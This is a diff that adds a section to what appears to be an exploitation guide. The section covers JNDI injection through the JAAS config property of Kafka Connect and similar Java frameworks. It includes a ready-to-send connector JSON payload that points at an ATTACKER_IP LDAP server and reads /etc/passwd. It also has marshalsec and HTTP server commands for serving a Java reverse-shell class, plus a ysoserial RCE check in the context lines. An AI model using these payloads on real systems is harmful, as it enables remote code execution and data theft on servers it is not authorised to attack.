@@ -378,6 +378,38 @@ java -jar ysoserial.jar CommonsCollections6 'sleep 5' | base64 -w0
 # Measure response time — 5+ second delay = RCE confirmed
 ```
 
+### 7.4 JNDI injection via JAAS configuration property
+
+Java connector frameworks (Kafka Connect, Debezium, and similar) accept configuration properties like `sasl.jaas.config` that are passed directly to the JVM's JAAS authentication layer. If an attacker can supply connector configuration (e.g., via a connector management API), they can set this property to load a `JndiLoginModule` pointing at an attacker-controlled LDAP server. The JVM then connects to the LDAP server and deserializes the response — triggering RCE via a Java deserialization gadget chain.
+
+**Trigger:** Any API that accepts connector/broker/integration configuration as key-value pairs where `sasl.jaas.config` or similar JAAS properties are passed through without filtering.
+
+**Payload (Kafka Connect example):**
+```json
+{
+  "name": "attacker-connector",
+  "config": {
+    "connector.class": "org.apache.kafka.connect.file.FileStreamSourceConnector",
+    "tasks.max": "1",
+    "file": "/etc/passwd",
+    "topic": "test",
+    "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://ATTACKER_IP:1389/a\" useFirstPass=\"true\" tryFirstPass=\"false\" storePass=\"false\" clearPass=\"false\";"
+  }
+}
+```
+
+**Setup attacker LDAP server:**
+```bash
+# Using marshalsec to serve deserialization payload
+[RUN THIS]
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8000/#Exploit"
+
+# Serve the exploit class (compiled Java reverse shell)
+python3 -m http.server 8000
+```
+
+**Broadly applicable to:** Any Java application that passes user-controlled strings into JNDI lookups, JAAS config, or similar JVM-level configuration — not limited to Kafka. Also look for `com.sun.jndi.ldap.object.trustURLCodebase=true` (pre-Java 8u191) which enables direct code execution via JNDI without a deserialization chain.
+
 ---
 
 ## 8. .NET deserialization
